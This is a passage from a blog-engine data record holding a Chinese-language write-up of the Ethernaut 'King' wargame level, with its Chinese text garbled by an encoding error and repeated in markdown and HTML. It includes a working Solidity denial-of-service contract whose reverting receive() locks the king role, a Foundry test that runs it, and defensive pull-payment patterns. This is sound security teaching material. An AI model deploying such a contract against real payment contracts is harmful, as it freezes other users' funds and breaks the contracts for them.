assertFalse(success);\n        \n        // éªŒè¯æˆ‘ä»¬ä»ç„¶æ˜¯ king\n        assertEq(instance._king(), address(attacker));\n        \n        // è¿™ä¸ªå…³å¡æ— æ³•æ­£å¸¸æäº¤ï¼Œå› ä¸ºæˆ‘ä»¬ç ´åäº†æ¸¸æˆæœºåˆ¶\n        // ä½†è¿™æ­£æ˜¯å…³å¡æƒ³è¦æ¼”ç¤ºçš„æ”»å‡»æ•ˆæœ\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1. **åˆ†æå½“å‰ prize**ï¼šç¡®å®šéœ€è¦å¤šå°‘ ETH æˆä¸º king\n2. **éƒ¨ç½²æ”»å‡»åˆçº¦**ï¼šåˆçº¦çš„ `receive()` å‡½æ•°ä¼š revert\n3. **æˆä¸º king**ï¼šå‘é€è¶³å¤Ÿçš„ ETH\n4. **é”å®šç‹ä½**ï¼šä»»ä½•åç»­å°è¯•éƒ½ä¼šå› ä¸º transfer å¤±è´¥è€Œå›æ»š\n\n```solidity\n// éƒ¨ç½²æ”»å‡»åˆçº¦\nKingAttacker attacker = new KingAttacker{value: initialPrize + 1}(levelInstance);\n\n// å‘é€ ETH æˆä¸º king\nattacker.attack{value: initialPrize + 1}();\n\n// éªŒè¯æ”»å‡»æˆåŠŸ\nassertEq(instance._king(), address(attacker));\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. ä½¿ç”¨ Pull Payment æ¨¡å¼\n\n```solidity\n// âŒ ä¸å®‰å…¨ï¼šPush Payment\ncontract VulnerableKing {\n    address public king;\n    uint public prize;\n    \n    receive() external payable {\n        require(msg.value >= prize);\n        payable(king).transfer(msg.value);  // å¯èƒ½å¤±è´¥\n        king = msg.sender;\n        prize = msg.value;\n    }\n}\n\n// âœ… å®‰å…¨ï¼šPull Payment\ncontract SecureKing {\n    address public king;\n    uint public prize;\n    mapping(address => uint) public pendingWithdrawals;\n    \n    receive() external payable {\n        require(msg.value >= prize);\n        \n        // è®°å½•å¾…æå–é‡‘é¢\n        if (king != address(0)) {\n            pendingWithdrawals[king] += prize;\n        }\n        \n        king = msg.sender;\n        prize = msg.value;\n    }\n    \n    // è®©ç”¨æˆ·è‡ªå·±æå–èµ„é‡‘\n    function withdraw() public {\n        uint amount = pendingWithdrawals[msg.sender];\n        require(amount > 0, \"No funds to withdraw\");\n        \n        pendingWithdrawals[msg.sender] = 0;\n        payable(msg.sender).transfer(amount);\n    }\n}\n```\n\n### 2. ä½¿ç”¨ call å¹¶å¤„ç†å¤±è´¥\n\n```solidity\ncontract ImprovedKing {\n    address public king;\n    uint public prize;\n    \n    receive() external payable {\n        require(msg.value >= prize);\n        \n        // ä½¿ç”¨ call å¹¶å¤„ç†å¤±è´¥\n        if (king != address(0)) {\n            (bool success, ) = payable(king).call{value: prize}(\"\");\n            if (!success) {\n                // è®°å½•å¤±è´¥çš„æ”¯ä»˜ï¼Œè®©ç”¨æˆ·æ‰‹åŠ¨æå–\n                pendingWithdrawals[king] += prize;\n            }\n        }\n        \n        king = msg.sender;\n        prize = msg.value;\n    }\n}\n```\n\n### 3. å®ç°ç´§æ€¥åœæ­¢æœºåˆ¶\n\n```solidity\ncontract SafeKing {\n    address public king;\n    uint public prize;\n    bool public paused;\n    address public owner;\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n    \n    modifier whenNotPaused() {\n        require(!paused);\n        _;\n    }\n    \n    function pause() public onlyOwner {\n        paused = true;\n    }\n    \n    function unpause() public onlyOwner {\n        paused = false;\n    }\n    \n    receive() external payable whenNotPaused {\n        // æ­£å¸¸é€»è¾‘\n    }\n}\n```\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n### DoS æ”»å‡»æ£€æµ‹\n\n```solidity\n// æ£€æµ‹åˆçº¦æ˜¯å¦èƒ½æ¥æ”¶ ETH\nfunction canReceiveEther(address target) public returns (bool) {\n    (bool success, ) = target.call{value: 1 wei}(\"\");\n    return success;\n}\n```\n\n### Gas é™åˆ¶åˆ†æ\n\n```bash\n# ä½¿ç”¨ forge åˆ†æ Gas ä½¿ç”¨\nforge test --gas-report\n\n# æ£€æŸ¥ transfer vs call Gas æ¶ˆè€—\ncast estimate --value 1000000000000000000 <CONTRACT_ADDRESS> \"receive()\"\n```\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n- `send` å’Œ `transfer` ç°åœ¨å·²è¢«å¼ƒç”¨ï¼Œå³ä½¿æ˜¯ `call`ï¼Œä½¿ç”¨æ—¶æœ€å¥½æŒ‰ç…§æ£€æŸ¥-æ•ˆæœ-äº¤äº’æ¨¡å¼è°ƒç”¨\n- å¤–éƒ¨è°ƒç”¨å¿…é¡»è°¨æ…ä½¿ç”¨ï¼Œå¿…é¡»æ­£ç¡®å¤„ç†é”™è¯¯\n- Push Payment æ¨¡å¼å®¹æ˜“å—åˆ° DoS æ”»å‡»\n\n**æ”»å‡»å‘é‡**:\n- é€šè¿‡æ‹’ç»æ¥æ”¶ ETH æ¥ç ´åæ”¯ä»˜æµç¨‹\n- åˆ©ç”¨ `transfer` å¤±è´¥æ—¶çš„å›æ»šç‰¹æ€§\n- æˆä¸ºæ°¸ä¹…çš„ kingï¼Œç ´åæ¸¸æˆæœºåˆ¶\n\n**é˜²å¾¡ç­–ç•¥**:\n- ä½¿ç”¨ Pull Payment æ¨¡å¼\n- æ­£ç¡®å¤„ç†å¤–éƒ¨è°ƒç”¨å¤±è´¥\n- å®ç°ç´§æ€¥åœæ­¢å’Œæ¢å¤æœºåˆ¶\n- é¿å…ä¾èµ–å¤–éƒ¨è°ƒç”¨çš„æˆåŠŸ\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[ä¸Šä¸€å…³: Level 8 - Vault](/2025/01/25/ethernaut-level-08-vault/)**\n- **[ä¸‹ä¸€å…³: Level 10 - Re-entrancy](/2025/01/25/ethernaut-level-10-reentrancy/)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n","source":"_posts/ethernaut-level-09-king.md","raw":"---\ntitle: 'Ethernaut Level 9: King - æ‹’ç»æœåŠ¡æ”»å‡»'\ndate: 2025-01-25 15:35:00\nupdated: 2025-01-25 15:35:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - åŸºç¡€æ”»å‡»ç¯‡ (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - æ‹’ç»æœåŠ¡æ”»å‡»\n  - DoS\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\n  - å¤–éƒ¨è°ƒç”¨\nseries: Ethernaut Foundry Solutions\nexcerpt: \"æ·±å…¥å­¦ä¹ æ‹’ç»æœåŠ¡æ”»å‡»å’Œå¤–éƒ¨è°ƒç”¨å®‰å…¨ï¼ŒæŒæ¡ King å…³å¡çš„æ”»å‡»æŠ€æœ¯å’Œé˜²æŠ¤æªæ–½ã€‚ç†è§£ transferã€send å’Œ call çš„åŒºåˆ«åŠå®‰å…¨é£é™©ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 9: King - æ‹’ç»æœåŠ¡æ”»å‡»\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 9 - King](https://ethernaut.openzeppelin.com/level/9)  \n> **æ”»å‡»ç±»å‹**: æ‹’ç»æœåŠ¡æ”»å‡» (DoS)  \n> **éš¾åº¦**: â­â­â­â­â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nè°å‡ºèµ„æ›´é«˜çš„æ—¶å€™ï¼Œè°å°±æˆä¸º kingï¼Œç›®æ ‡æ˜¯è®©è‡ªå·±æˆä¸º king ä¹‹åï¼Œåˆ«äººæ— æ³•å¤ºå–ç‹ä½ã€‚æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬å¿…é¡»æˆä¸ºç‹è€…å¹¶ä¸€ç›´ä¿æŒå›½ç‹ï¼Œç„¶åæ‰“ç ´æ¸¸æˆã€‚\n\n![King Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel9.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### transfer() å‡½æ•°çš„ç‰¹æ€§\n\næˆ‘ä»¬éœ€è¦ç†è§£ `transfer`ï¼ˆç°åœ¨åŸºæœ¬è¢«å¼ƒç”¨ï¼‰æ˜¯å¦‚ä½•åœ¨ Solidity ä¸­å·¥ä½œçš„ï¼š\n- å¦‚æœ `transfer` å¤±è´¥ï¼Œæ­¤å‡½æ•°æŠ›å‡ºé”™è¯¯ï¼Œä½†ä¸è¿”å›å¸ƒå°”å€¼\n- è¿™æ„å‘³ç€å¦‚æœ `transfer` å¤±è´¥ï¼Œäº¤æ˜“å°†æ¢å¤\n- Gas é™åˆ¶ä¸º 2300ï¼Œä¸è¶³ä»¥æ‰§è¡Œå¤æ‚é€»è¾‘\n\n### å…³é”®æ¼æ´ä»£ç \n\n```solidity\nreceive() external payable {\n    require(msg.value >= prize || msg.sender == owner);\n    payable(king).transfer(msg.value);  // æ˜“å—æ”»å‡»çš„ç‚¹\n    king = msg.sender;\n    prize = msg.value;\n}\n```\n\n### æ”»å‡»å‘é‡\n\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨ `transfer()` å‡½æ•°å¤±è´¥æ—¶ä¼šå›æ»šçš„ç‰¹æ€§ï¼š\n1. éƒ¨ç½²ä¸€ä¸ªåˆçº¦æˆä¸º king\n2. åˆçº¦ä¸å®šä¹‰ `receive()` æˆ– `fallback()` å‡½æ•°\n3. æˆ–è€…åœ¨ `receive()` å‡½æ•°ä¸­ç›´æ¥ revert\n4. è¿™æ ·åˆçº¦å°†æ— æ³•æ¥æ”¶ ETHï¼Œé˜»æ­¢ä»»ä½•äººæˆä¸ºæ–°çš„ king\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Ethernaut.sol\";\nimport \"../src/levels/KingFactory.sol\";\n\ncontract KingAttacker {\n    King instance;\n\n    constructor(address payable _king) payable {\n        instance = King(_king);\n    }\n\n    function attack() public payable {\n        (bool success, ) = address(instance).call{value: msg.value}(\"\");\n        require(success, \"Attack failed\");\n    }\n\n    // å…³é”®ï¼šæ‹’ç»æ¥æ”¶ ETH\n    receive() external payable {\n        revert(\"I will always be the king!\");\n    }\n}\n\ncontract KingTest is Test {\n    Ethernaut ethernaut;\n    KingFactory kingFactory;\n    \n    function setUp() public {\n        ethernaut = new Ethernaut();\n        kingFactory = new KingFactory();\n        ethernaut.registerLevel(kingFactory);\n    }\n    \n    function testKingExploit() public {\n        // åˆ›å»ºå…³å¡å®ä¾‹\n        address payable levelInstance = payable(ethernaut.createLevelInstance{value: 1 ether}(kingFactory));\n        King instance = King(levelInstance);\n        \n        // æ£€æŸ¥åˆå§‹çŠ¶æ€\n        uint256 initialPrize = instance.prize();\n        address initialKing = instance._king();\n        \n        // éƒ¨ç½²æ”»å‡»åˆçº¦\n        KingAttacker attacker = new KingAttacker{value: initialPrize + 1}(levelInstance);\n        \n        // æ‰§è¡Œæ”»å‡»ï¼šæˆä¸º king\n        attacker.attack{value: initialPrize + 1}();\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertEq(instance._king(), address(attacker));\n        \n        // å°è¯•æœ‰äººè¶…è¶Šæˆ‘ä»¬ï¼ˆåº”è¯¥å¤±è´¥ï¼‰\n        vm.expectRevert();\n        (bool success, ) = levelInstance.call{value: initialPrize + 2}(\"\");\n        assertFalse(success);\n        \n        // éªŒè¯æˆ‘ä»¬ä»ç„¶æ˜¯ king\n        assertEq(instance._king(), address(attacker));\n        \n        // è¿™ä¸ªå…³å¡æ— æ³•æ­£å¸¸æäº¤ï¼Œå› ä¸ºæˆ‘ä»¬ç ´åäº†æ¸¸æˆæœºåˆ¶\n        // ä½†è¿™æ­£æ˜¯å…³å¡æƒ³è¦æ¼”ç¤ºçš„æ”»å‡»æ•ˆæœ\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1. **åˆ†æå½“å‰ prize**ï¼šç¡®å®šéœ€è¦å¤šå°‘ ETH æˆä¸º king\n2. **éƒ¨ç½²æ”»å‡»åˆçº¦**ï¼šåˆçº¦çš„ `receive()` å‡½æ•°ä¼š revert\n3. **æˆä¸º king**ï¼šå‘é€è¶³å¤Ÿçš„ ETH\n4. **é”å®šç‹ä½**ï¼šä»»ä½•åç»­å°è¯•éƒ½ä¼šå› ä¸º transfer å¤±è´¥è€Œå›æ»š\n\n```solidity\n// éƒ¨ç½²æ”»å‡»åˆçº¦\nKingAttacker attacker = new KingAttacker{value: initialPrize + 1}(levelInstance);\n\n// å‘é€ ETH æˆä¸º king\nattacker.attack{value: initialPrize + 1}();\n\n// éªŒè¯æ”»å‡»æˆåŠŸ\nassertEq(instance._king(), address(attacker));\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. ä½¿ç”¨ Pull Payment æ¨¡å¼\n\n```solidity\n// âŒ ä¸å®‰å…¨ï¼šPush Payment\ncontract VulnerableKing {\n    address public king;\n    uint public prize;\n    \n    receive() external payable {\n        require(msg.value >= prize);\n        payable(king).transfer(msg.value);  // å¯èƒ½å¤±è´¥\n        king = msg.sender;\n        prize = msg.value;\n    }\n}\n\n// âœ… å®‰å…¨ï¼šPull Payment\ncontract SecureKing {\n    address public king;\n    uint public prize;\n    mapping(address => uint) public pendingWithdrawals;\n    \n    receive() external payable {\n        require(msg.value >= prize);\n        \n        // è®°å½•å¾…æå–é‡‘é¢\n        if (king != address(0)) {\n            pendingWithdrawals[king] += prize;\n        }\n        \n        king = msg.sender;\n        prize = msg.value;\n    }\n    \n    // è®©ç”¨æˆ·è‡ªå·±æå–èµ„é‡‘\n    function withdraw() public {\n        uint amount = pendingWithdrawals[msg.sender];\n        require(amount > 0, \"No funds to withdraw\");\n        \n        pendingWithdrawals[msg.sender] = 0;\n        payable(msg.sender).transfer(amount);\n    }\n}\n```\n\n### 2. ä½¿ç”¨ call å¹¶å¤„ç†å¤±è´¥\n\n```solidity\ncontract ImprovedKing {\n    address public king;\n    uint public prize;\n    \n    receive() external payable {\n        require(msg.value >= prize);\n        \n        // ä½¿ç”¨ call å¹¶å¤„ç†å¤±è´¥\n        if (king != address(0)) {\n            (bool success, ) = payable(king).call{value: prize}(\"\");\n            if (!success) {\n                // è®°å½•å¤±è´¥çš„æ”¯ä»˜ï¼Œè®©ç”¨æˆ·æ‰‹åŠ¨æå–\n                pendingWithdrawals[king] += prize;\n            }\n        }\n        \n        king = msg.sender;\n        prize = msg.value;\n    }\n}\n```\n\n### 3. å®ç°ç´§æ€¥åœæ­¢æœºåˆ¶\n\n```solidity\ncontract SafeKing {\n    address public king;\n    uint public prize;\n    bool public paused;\n    address public owner;\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n    \n    modifier whenNotPaused() {\n        require(!paused);\n        _;\n    }\n    \n    function pause() public onlyOwner {\n        paused = true;\n    }\n    \n    function unpause() public onlyOwner {\n        paused = false;\n    }\n    \n    receive() external payable whenNotPaused {\n        // æ­£å¸¸é€»è¾‘\n    }\n}\n```\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n### DoS æ”»å‡»æ£€æµ‹\n\n```solidity\n// æ£€æµ‹åˆçº¦æ˜¯å¦èƒ½æ¥æ”¶ ETH\nfunction canReceiveEther(address target) public returns (bool) {\n    (bool success, ) = target.call{value: 1 wei}(\"\");\n    return success;\n}\n```\n\n### Gas é™åˆ¶åˆ†æ\n\n```bash\n# ä½¿ç”¨ forge åˆ†æ Gas ä½¿ç”¨\nforge test --gas-report\n\n# æ£€æŸ¥ transfer vs call Gas æ¶ˆè€—\ncast estimate --value 1000000000000000000 <CONTRACT_ADDRESS> \"receive()\"\n```\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n- `send` å’Œ `transfer` ç°åœ¨å·²è¢«å¼ƒç”¨ï¼Œå³ä½¿æ˜¯ `call`ï¼Œä½¿ç”¨æ—¶æœ€å¥½æŒ‰ç…§æ£€æŸ¥-æ•ˆæœ-äº¤äº’æ¨¡å¼è°ƒç”¨\n- å¤–éƒ¨è°ƒç”¨å¿…é¡»è°¨æ…ä½¿ç”¨ï¼Œå¿…é¡»æ­£ç¡®å¤„ç†é”™è¯¯\n- Push Payment æ¨¡å¼å®¹æ˜“å—åˆ° DoS æ”»å‡»\n\n**æ”»å‡»å‘é‡**:\n- é€šè¿‡æ‹’ç»æ¥æ”¶ ETH æ¥ç ´åæ”¯ä»˜æµç¨‹\n- åˆ©ç”¨ `transfer` å¤±è´¥æ—¶çš„å›æ»šç‰¹æ€§\n- æˆä¸ºæ°¸ä¹…çš„ kingï¼Œç ´åæ¸¸æˆæœºåˆ¶\n\n**é˜²å¾¡ç­–ç•¥**:\n- ä½¿ç”¨ Pull Payment æ¨¡å¼\n- æ­£ç¡®å¤„ç†å¤–éƒ¨è°ƒç”¨å¤±è´¥\n- å®ç°ç´§æ€¥åœæ­¢å’Œæ¢å¤æœºåˆ¶\n- é¿å…ä¾èµ–å¤–éƒ¨è°ƒç”¨çš„æˆåŠŸ\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[ä¸Šä¸€å…³: Level 8 - Vault](/2025/01/25/ethernaut-level-08-vault/)**\n- **[ä¸‹ä¸€å…³: Level 10 - Re-entrancy](/2025/01/25/ethernaut-level-10-reentrancy/)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n","slug":"ethernaut-level-09-king","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbp7000sbf5q9cik2wel","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-9-King-æ‹’ç»æœåŠ¡æ”»å‡»\"><a href=\"#ğŸ¯-Ethernaut-Level-9-King-æ‹’ç»æœåŠ¡æ”»å‡»\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 9: King - æ‹’ç»æœåŠ¡æ”»å‡»\"></a>ğŸ¯ Ethernaut Level 9: King - æ‹’ç»æœåŠ¡æ”»å‡»</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/9\">Ethernaut Level 9 - King</a><br><strong>æ”»å‡»ç±»å‹</strong>: æ‹’ç»æœåŠ¡æ”»å‡» (DoS)<br><strong>éš¾åº¦</strong>: â­â­â­â­â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>è°å‡ºèµ„æ›´é«˜çš„æ—¶å€™ï¼Œè°å°±æˆä¸º kingï¼Œç›®æ ‡æ˜¯è®©è‡ªå·±æˆä¸º king ä¹‹åï¼Œåˆ«äººæ— æ³•å¤ºå–ç‹ä½ã€‚æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬å¿…é¡»æˆä¸ºç‹è€…å¹¶ä¸€ç›´ä¿æŒå›½ç‹ï¼Œç„¶åæ‰“ç ´æ¸¸æˆã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel9.svg\" alt=\"King Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"transfer-å‡½æ•°çš„ç‰¹æ€§\"><a href=\"#transfer-å‡½æ•°çš„ç‰¹æ€§\" class=\"headerlink\" title=\"transfer() å‡½æ•°çš„ç‰¹æ€§\"></a>transfer() å‡½æ•°çš„ç‰¹æ€§</h3><p>æˆ‘ä»¬éœ€è¦ç†è§£ <code>transfer</code>ï¼ˆç°åœ¨åŸºæœ¬è¢«å¼ƒç”¨ï¼‰æ˜¯å¦‚ä½•åœ¨ Solidity ä¸­å·¥ä½œçš„ï¼š</p>\n<ul>\n<li>å¦‚æœ <code>transfer</code> å¤±è´¥ï¼Œæ­¤å‡½æ•°æŠ›å‡ºé”™è¯¯ï¼Œä½†ä¸è¿”å›å¸ƒå°”å€¼</li>\n<li>è¿™æ„å‘³ç€å¦‚æœ <code>transfer</code> å¤±è´¥ï¼Œäº¤æ˜“å°†æ¢å¤</li>\n<li>Gas é™åˆ¶ä¸º 2300ï¼Œä¸è¶³ä»¥æ‰§è¡Œå¤æ‚é€»è¾‘</li>\n</ul>\n<h3 id=\"å…³é”®æ¼æ´ä»£ç \"><a href=\"#å…³é”®æ¼æ´ä»£ç \" class=\"headerlink\" title=\"å…³é”®æ¼æ´ä»£ç \"></a>å…³é”®æ¼æ´ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">receive() external payable &#123;</span><br><span class=\"line\">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class=\"line\">    payable(king).transfer(msg.value);  // æ˜“å—æ”»å‡»çš„ç‚¹</span><br><span class=\"line\">    king = msg.sender;</span><br><span class=\"line\">    prize = msg.value;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ”»å‡»å‘é‡\"><a href=\"#æ”»å‡»å‘é‡\" class=\"headerlink\" title=\"æ”»å‡»å‘é‡\"></a>æ”»å‡»å‘é‡</h3><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>transfer()</code> å‡½æ•°å¤±è´¥æ—¶ä¼šå›æ»šçš„ç‰¹æ€§ï¼š</p>\n<ol>\n<li>éƒ¨ç½²ä¸€ä¸ªåˆçº¦æˆä¸º king</li>\n<li>åˆçº¦ä¸å®šä¹‰ <code>receive()</code> æˆ– <code>fallback()</code> å‡½æ•°</li>\n<li>æˆ–è€…åœ¨ <code>receive()</code> å‡½æ•°ä¸­ç›´æ¥ revert</li>\n<li>è¿™æ ·åˆçº¦å°†æ— æ³•æ¥æ”¶ ETHï¼Œé˜»æ­¢ä»»ä½•äººæˆä¸ºæ–°çš„ king</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class=\"line\">import &quot;../src/levels/KingFactory.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract KingAttacker &#123;</span><br><span class=\"line\">    King instance;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address payable _king) payable &#123;</span><br><span class=\"line\">        instance = King(_king);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack() public payable &#123;</span><br><span class=\"line\">        (bool success, ) = address(instance).call&#123;value: msg.value&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(success, &quot;Attack failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // å…³é”®ï¼šæ‹’ç»æ¥æ”¶ ETH</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        revert(&quot;I will always be the king!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract KingTest is Test &#123;</span><br><span class=\"line\">    Ethernaut ethernaut;</span><br><span class=\"line\">    KingFactory kingFactory;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        ethernaut = new Ethernaut();</span><br><span class=\"line\">        kingFactory = new KingFactory();</span><br><span class=\"line\">        ethernaut.registerLevel(kingFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testKingExploit() public &#123;</span><br><span class=\"line\">        // åˆ›å»ºå…³å¡å®ä¾‹</span><br><span class=\"line\">        address payable levelInstance = payable(ethernaut.createLevelInstance&#123;value: 1 ether&#125;(kingFactory));</span><br><span class=\"line\">        King instance = King(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ£€æŸ¥åˆå§‹çŠ¶æ€</span><br><span class=\"line\">        uint256 initialPrize = instance.prize();</span><br><span class=\"line\">        address initialKing = instance._king();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½²æ”»å‡»åˆçº¦</span><br><span class=\"line\">        KingAttacker attacker = new KingAttacker&#123;value: initialPrize + 1&#125;(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ‰§è¡Œæ”»å‡»ï¼šæˆä¸º king</span><br><span class=\"line\">        attacker.attack&#123;value: initialPrize + 1&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertEq(instance._king(), address(attacker));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // å°è¯•æœ‰äººè¶…è¶Šæˆ‘ä»¬ï¼ˆåº”è¯¥å¤±è´¥ï¼‰</span><br><span class=\"line\">        vm.expectRevert();</span><br><span class=\"line\">        (bool success, ) = levelInstance.call&#123;value: initialPrize + 2&#125;(&quot;&quot;);</span><br><span class=\"line\">        assertFalse(success);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æˆ‘ä»¬ä»ç„¶æ˜¯ king</span><br><span class=\"line\">        assertEq(instance._king(), address(attacker));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // è¿™ä¸ªå…³å¡æ— æ³•æ­£å¸¸æäº¤ï¼Œå› ä¸ºæˆ‘ä»¬ç ´åäº†æ¸¸æˆæœºåˆ¶</span><br><span class=\"line\">        // ä½†è¿™æ­£æ˜¯å…³å¡æƒ³è¦æ¼”ç¤ºçš„æ”»å‡»æ•ˆæœ</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>åˆ†æå½“å‰ prize</strong>ï¼šç¡®å®šéœ€è¦å¤šå°‘ ETH æˆä¸º 